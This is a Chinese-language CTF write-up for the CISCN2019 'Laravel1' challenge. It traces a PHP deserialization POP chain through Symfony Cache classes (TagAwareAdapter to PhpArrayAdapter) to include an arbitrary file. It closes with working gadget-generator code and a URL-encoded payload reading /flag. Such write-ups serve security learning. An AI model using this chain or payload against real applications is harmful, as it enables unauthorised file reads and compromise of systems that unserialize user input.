---
title: CISCN2019总决赛Day1Web4-Laravel1
date: 2025-05-29 12:06:39
tags:
- 代码审计
- Laravel
- php反序列化
- phpstorm全局查找
category:
- 刷题笔记
---

# CISCN2019总决赛Day1Web4-Laravel1

源码：

```
<?php
//backup in source.tar.gz

namespace App\Http\Controllers;


class IndexController extends Controller
{
    public function index(\Illuminate\Http\Request $request){
        $payload=$request->input("payload");
        if(empty($payload)){
            highlight_file(__FILE__);
        }else{
            @unserialize($payload);
        }
    }
}
```

很明显是一个反序列化漏洞，然后还给了我们源码，下载source.tar.gz

将源码下载下来之后，我们需要查找含有__destruct魔术方法的php文件。

---

## Phpstorm全局查找

按下 `Ctrl+Alt+Shift+N` (Windows/Linux) 或 `Cmd+Option+O` (Mac)

然后选择find in files，选择目录

然后搜索function __destruct

---

找到`vendor\symfony\symfony\src\Symfony\Component\Cache\Adapter\TagAwareAdapter.php`

```
  public function __destruct()
    {
        $this->commit();
    }
```

这个类中的`__destruct`方法会调用`$this->commit()`
而`$this->commit()`又会调用`$this->invalidateTags([])`

```
    public function commit()
    {
        return $this->invalidateTags([]);
    }
```

进入invalidateTags方法中。

```
    if ($this->deferred) {
            #判断$this->deferred是否存在
            $items = $this->deferred;
            foreach ($items as $key => $item) {
                #将$this->deferred。键 值分离
                if (!$this->pool->saveDeferred($item)) {
                    #调用$this->pool-saveDeferred($item)
                    unset($this->deferred[$key]);
                    $ok = false;
                }
            }

            $f = $this->getTagsByKey;
            $tagsByKey = $f($items);
            $this->deferred = [];
        }
```

在这里`$this->pool`是可控的。也就是说。我们需要找一个类中有saveDeferred方法的类

去看`__construct`方法中`$this->pool`得是AdapterInterface接口的
那么现在我们得找一个Adapterinterface接口并且存在saveDeferred方法的类

```
class PhpArrayAdapter implements AdapterInterface, CacheInterface, PruneableInterface, ResettableInterface
```

进入这个类

```
  public function saveDeferred(CacheItemInterface $item)
    {
        if (null === $this->values) {
            $this->initialize();
        }

        return !isset($this->keys[$item->getKey()]) && $this->pool->saveDeferred($item);
    }
```

全局搜CacheItemInterface接口

Cacheltem.php

```
final class CacheItem implements ItemInterface
```

条件都满足了。继续往下走
它会执行`$this->initialize()`方法

全局搜initialize()方法。



```
# PhpArrayAdapter.php

private function initialize()
    {
        if (!file_exists($this->file)) {
            $this->keys = $this->values = [];

            return;
        }
        $values = (include $this->file) ?: [[], []];

        if (2 !== \count($values) || !isset($values[0], $values[1])) {
            $this->keys = $this->values = [];
        } else {
            list($this->keys, $this->values) = $values;
        }
    }
```

他会incluce。一个文件。那么我们可以盲猜/flag。

pop链

```
<?php
namespace Symfony\Component\Cache{
    final class CacheItem{
    }
}

namespace Symfony\Component\Cache\Adapter{
    use Symfony\Component\Cache\CacheItem;
    class PhpArrayAdapter{
        private $file='/flag';
    }
    class TagAwareAdapter{
        private $deferred;
        private $pool;
        public function __construct(){
            $this->deferred = array('xxx' => new CacheItem());
            $this->pool = new PhpArrayAdapter();
        }
    }
$a=new TagAwareAdapter();
echo urlencode(serialize($a));
}
?>
#这两个类都是在Symfony\Component\Cache\Adapter命名空间下的
#而Cacheitem类则不在同一个类下。所以我们得新建一个命名空间。并且use导入
```

payload：

```
?payload=O%3A47%3A%22Symfony%5CComponent%5CCache%5CAdapter%5CTagAwareAdapter%22%3A2%3A%7Bs%3A57%3A%22%00Symfony%5CComponent%5CCache%5CAdapter%5CTagAwareAdapter%00deferred%22%3Ba%3A1%3A%7Bs%3A3%3A%22xxx%22%3BO%3A33%3A%22Symfony%5CComponent%5CCache%5CCacheItem%22%3A0%3A%7B%7D%7Ds%3A53%3A%22%00Symfony%5CComponent%5CCache%5CAdapter%5CTagAwareAdapter%00pool%22%3BO%3A47%3A%22Symfony%5CComponent%5CCache%5CAdapter%5CPhpArrayAdapter%22%3A1%3A%7Bs%3A53%3A%22%00Symfony%5CComponent%5CCache%5CAdapter%5CPhpArrayAdapter%00file%22%3Bs%3A5%3A%22%2Fflag%22%3B%7D%7D
```





